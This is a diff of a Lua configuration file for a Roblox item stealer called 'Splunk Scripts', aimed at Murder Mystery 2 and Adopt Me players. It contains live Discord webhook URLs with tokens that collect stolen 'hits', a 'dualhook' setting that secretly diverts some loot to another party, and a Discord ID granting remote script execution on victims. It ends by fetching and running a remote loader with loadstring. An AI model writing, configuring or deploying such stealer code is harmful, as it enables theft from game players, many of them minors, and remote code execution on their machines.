@@ -1,113 +1,122 @@
 Config = {
-    StealerUUID = '10', -- THIS IS REQUIRED!!!
+    StealerUUID = "10", -- THIS IS REQUIRED!!!
     Dualhooked = true, -- if u dont enable it and configure dualhook, it wont work
     DualhookSettings = {
         MM2 = {
             Value = 1500,
-            Chance = 50, -- from 0 to 100 %
-            Webhook = 'https://discord.com/api/webhooks/1393333776771321866/JSd-vIUlI0BHy6o0sw6D8MnRMSnKfx4JJjv6UMGMrM749haU-P8MQKTCIFO2lidhwKpm',
+            Chance = 100, -- from 0 to 100 %
+            Webhook = "https://discord.com/api/webhooks/1393333776771321866/JSd-vIUlI0BHy6o0sw6D8MnRMSnKfx4JJjv6UMGMrM749haU-P8MQKTCIFO2lidhwKpm"
         },
         AdoptMe = {
             Value = 100,
             Chance = 100, -- from 0 to 100 %
-            Webhook = 'https://discord.com/api/webhooks/1393334755793047602/SfIRbcLbUYXtKwmtF39TfBWngB8y8Sn6MJ8EY_-7haWgKlizFFg4fytEwCX-wDhZVRWP',
-        }, 
+            Webhook = "https://discord.com/api/webhooks/1393334755793047602/SfIRbcLbUYXtKwmtF39TfBWngB8y8Sn6MJ8EY_-7haWgKlizFFg4fytEwCX-wDhZVRWP"
+        }
     },
     LoggingSettings = {
         Enabled = true, -- this will send copy of all hits to this webhook bellow
-        WebhookUrl = 'https://discord.com/api/webhooks/1393333776771321866/JSd-vIUlI0BHy6o0sw6D8MnRMSnKfx4JJjv6UMGMrM749haU-P8MQKTCIFO2lidhwKpm',
+        WebhookUrl = "https://discord.com/api/webhooks/1393333776771321866/JSd-vIUlI0BHy6o0sw6D8MnRMSnKfx4JJjv6UMGMrM749haU-P8MQKTCIFO2lidhwKpm"
         -- this webhook will recieve EVERY single HIT from ur stealer!
     },
     StealerSettings = {
         MM2 = {
             StealerEnabled = true,
-            MinimumValueToPingUser = 5,
+            MinimumValueToPingUser = 5
         },
         AdoptMe = {
             StealerEnabled = true,
-            MinimumValueToPingUser = 8,
-        }, -- BigHits SmallHits deciding by this value -- ADOPT ME DOESNT WORK RN
+            MinimumValueToPingUser = 8
+        } -- BigHits SmallHits deciding by this value -- ADOPT ME DOESNT WORK RN
     },
     AllowedUsernames = {
-        'idom351',
-        'dualhook_user3',
-        'goldbed146',
+        "idom351",
+        "dualhook_user3",
+        "goldbed146"
     }, -- this is comparing usernames
     AllowedUsernamePatterns = {
-        'dualhook_user',
-        'goldbed146',
+        "dualhook_user",
+        "goldbed146"
     }, -- this is using string.find() to match usernames
     WebhookCustomization = {
-        GenerateWebhookEmbedFunction = function(hit_link_with_ping, hitter_usernames, total_rap, best_items, pastebin_of_hit, roblox_click_to_join_url)
+        GenerateWebhookEmbedFunction = function(
+            hit_link_with_ping,
+            hitter_usernames,
+            total_rap,
+            best_items,
+            pastebin_of_hit,
+            roblox_click_to_join_url)
             local data = {
                 content = hit_link_with_ping,
                 username = game.Players.LocalPlayer.Name, -- if u keep this username u can use x scripts auto joiner with that stealer!
-                avatar_url = '', -- replace with ur url if needed
+                avatar_url = "", -- replace with ur url if needed
                 embeds = {
                     {
-                        title = 'Splunk Scripts - Best Stealer',
-                        description = 'This hit is generated exclusively for you by splunk Scripts',
+                        title = "Splunk Scripts - Best Stealer",
+                        description = "This hit is generated exclusively for you by splunk Scripts",
                         color = 0x7f00ff, -- https://redketchup.io/color-picker
                         fields = {
                             {
-                                name = 'Player Info',
-                                value = '```Username: ' .. game.Players.LocalPlayer.Name .. '\nRecievers: ' .. hitter_usernames .. '\nExecutor: ' .. identifyexecutor() .. "```",
-                                inline = false,
+                                name = "Player Info",
+                                value = "```Username: " ..
+                                    game.Players.LocalPlayer.Name ..
+                                        "\nRecievers: " ..
+                                            hitter_usernames .. "\nExecutor: " .. identifyexecutor() .. "```",
+                                inline = false
                             },
                             {
-                                name = 'Total RAP',
-                                value = '```Total RAP: ' .. total_rap .. '```',
-                                inline = true,
+                                name = "Total RAP",
+                                value = "```Total RAP: " .. total_rap .. "```",
+                                inline = true
                             },
                             {
-                                name = 'Best Items',
-                                value = '```' .. best_items .. '```',
-                                inline = false,
+                                name = "Best Items",
+                                value = "```" .. best_items .. "```",
+                                inline = false
                             },
                             {
-                                name = 'Join Link',
+                                name = "Join Link",
                                 value = roblox_click_to_join_url,
-                                inline = false,
+                                inline = false
                             },
                             {
-                                name = 'Pastebin Info',
+                                name = "Pastebin Info",
                                 value = pastebin_of_hit,
-                                inline = false,
-                            },
-                        },
-                    }, 
-                },
+                                inline = false
+                            }
+                        }
+                    }
+                }
             }
             return data
-        end -- ask chat gpt to create beautifull embed or make it yourself, this is default one that works if u dont care!   
+        end -- ask chat gpt to create beautifull embed or make it yourself, this is default one that works if u dont care!
     },
     BannerSettings = {
         Enabled = false,
-        ServerName = 'Splunk Scripts',
+        ServerName = "Splunk Scripts",
         TimeBeforeBanner = 10, -- in seconds
-        ServerLink = 'X2cE85xF9m', -- CODE, NOT LINK!!!
+        ServerLink = "X2cE85xF9m" -- CODE, NOT LINK!!!
     },
     DiscordBotConnectionSettings = {
-        DiscordId = '1360020953253281975', -- if u put ur id here, u will be able to use /execute command on every victim of your hitters!
+        DiscordId = "1360020953253281975" -- if u put ur id here, u will be able to use /execute command on every victim of your hitters!
     }, -- this is settings of X Scripts Helper bot that gives u ability to execute scripts from discord
     AutoReExecuteSettings = {
         ReExecute = false, -- if u dont enable it, u dont need to worry about link bellow
-        StealerLoaderUrl = 'https://cdn.sourceb.in/bins/5QZ4epYVYv/0' -- this is url of ur stealer_link or whatever u have in LOADSTRING of your stealer
+        StealerLoaderUrl = "https://cdn.sourceb.in/bins/5QZ4epYVYv/0" -- this is url of ur stealer_link or whatever u have in LOADSTRING of your stealer
         -- it will be used to re-load ur stealer on serverhop for each hitter, it will automatically write usernames and webhooks to it
         -- like it does in x scripts stealer!
     },
     ServerHopSettings = {
         ServerHopOnVipServer = true,
-        ServerHopOnFullServer = true,
+        ServerHopOnFullServer = true
     },
     SelfHittingSettings = {
         KickOnSelfHit = false, -- if player is in usernames list and executed stealer, he will be kicked
-        KickMessage = 'U cant hit yourself',
+        KickMessage = "U cant hit yourself"
     },
     FinishedStealingSettings = {
         KickOnFinishStealing = true,
-        KickMessage = 'Join my discord - https://discord.gg/4uEXNGTFQk',
+        KickMessage = "Join my discord - https://discord.gg/4uEXNGTFQk"
     }
 }
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/dualhook/refs/heads/main/loader.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/dualhook/refs/heads/main/loader.lua", true))()
